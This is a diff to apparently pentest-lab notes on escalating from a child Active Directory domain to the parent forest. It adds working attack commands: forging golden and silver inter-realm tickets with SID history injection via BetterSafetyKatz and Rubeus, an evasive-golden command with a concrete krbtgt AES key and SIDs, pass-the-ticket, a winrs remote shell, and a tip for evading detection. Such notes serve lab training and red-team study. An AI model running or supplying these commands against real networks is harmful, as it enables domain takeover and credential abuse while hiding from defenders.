@@ -27,7 +27,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
 Note that krbtgt can be used instead of the trust key.
 
 {% code overflow="wrap" %}
-```powershell
+```batch
 # Child to parent 
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<current_domain_sid> /sids:<sid_to_inject> /rc4:<trust_key> /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
 
@@ -52,19 +52,35 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:d
 | /ticket   | Path to save the ticket                          |
 
 {% code overflow="wrap" %}
-```powershell
+```batch
 # Same can be done with Rubeus
-Rubeus.exe evasive-silver /service:krbtgt/dollarcorp.moneycorp.local /rc4:<hash> /sid:<sid> /sids:<sids> /ldap /user:Administrator /nowrap
+# Child to parent
+Rubeus.exe evasive-silver /service:krbtgt/dollarcorp.moneycorp.local /rc4:<trust_key> /sid:<sid_current_domain> /sids:<enterprise_admin_group_sid> /ldap /user:Administrator /nowrap
+
+# Using krbtgt hash - No need to request for tgs later
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848  /netbios:dcorp /ptt
+
+# Accross Forest
+Rubeus.exe evasive-silver /service:krbtgt/dollarcorp.moneycorp.local /rc4:<trust_key> /sid:<sid_current_domain> /ldap /user:Administrator /nowrap
 ```
 {% endcode %}
+
+**id** is always the RID of the **default built-in domain Administrator** account.\
+Also, instead of putting Enterprise Admin Group SID, put `Domain Controllers SID, Enterrpise Domain Controllers SID` . It's opsec safe cause a domain admin is signing in to a enterprise admin level machine doesn't look normal.
 
 ### Request the TGS and pass it
 
 {% code overflow="wrap" %}
-```powershell
+```batch
 # Forge the ticket
 Rubeus.exe asktgs /service:http/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt /ticket:C:\AD\Tools\trust_tkt.kirbi
 ```
 {% endcode %}
 
 After that any attack can be performed according to the service requested.
+
+### Test the privilege
+
+```batch
+winrs -r:mcorp-dc cmd
+```
